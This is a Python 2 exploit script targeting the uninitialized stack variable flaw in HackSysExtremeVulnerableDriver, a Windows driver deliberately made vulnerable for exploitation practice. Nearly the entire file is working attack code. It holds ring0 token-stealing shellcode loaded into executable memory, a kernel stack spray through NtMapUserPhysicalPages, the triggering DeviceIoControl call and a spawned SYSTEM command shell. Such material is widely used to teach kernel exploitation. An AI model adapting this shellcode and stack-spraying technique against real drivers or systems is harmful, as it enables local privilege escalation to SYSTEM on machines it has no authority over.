#************************************************************
#uninitialized_stack_variable.py: Exploit for the Uninitialized Stack Variable Vulnerability.
#************************************************************
#Written by r0otki7 <https://github.com/r0otki7/>
#************************************************************
#Website: https://rootkits.xyz
#************************************************************

import ctypes, sys, struct
from ctypes import *
from subprocess import *
 
def logo():
	print """
		_ \        |    |    _) ___  | 
	   __| |   |  _ \  __|  |  /  |     /  
	  |    |   | (   | |      <   |    /   
	 _|   \___/ \___/ \__| _|\_\ _|  _/    
										   
	"""
def main():
    logo()
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not hevDevice or hevDevice == -1:
        print "*** Couldn't get Device Driver handle"
        sys.exit(-1)

    #Defining the ring0 shellcode and loading it in VirtualAlloc.
    shellcode = bytearray(
        "\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                      # jnz
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        "\x61"                          # popad
        "\xC3"                          # ret
    )

    ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))

    #Just converting the int returned address to a sprayable '\x\x\x\x' format.
    ptr_adr = hex(struct.unpack('<L', struct.pack('>L', ptr))[0])[2:].zfill(8).decode('hex') * 1024

    print "[+] Pointer for ring0 shellcode: {0}".format(hex(ptr))

    buf = '\x37\x13\xd3\xba'
    bufLength = len(buf)

    #Spraying the Kernel Stack.
    #Note that we'd need to prevent any clobbering of the stack from other functions.
    #Make sure to not include/call any function or Windows API between spraying the stack and triggering the vulnerability.

    print "\n[+] Spraying the Kernel Stack..."

    ntdll.NtMapUserPhysicalPages(None, 1024, ptr_adr)
    
    kernel32.DeviceIoControl(hevDevice, 0x22202f, buf, bufLength, None, 0, byref(c_ulong()), None)

    print "\n[+] nt authority\system shell incoming"
    Popen("start cmd", shell=True)
 
if __name__ == "__main__":
    main()
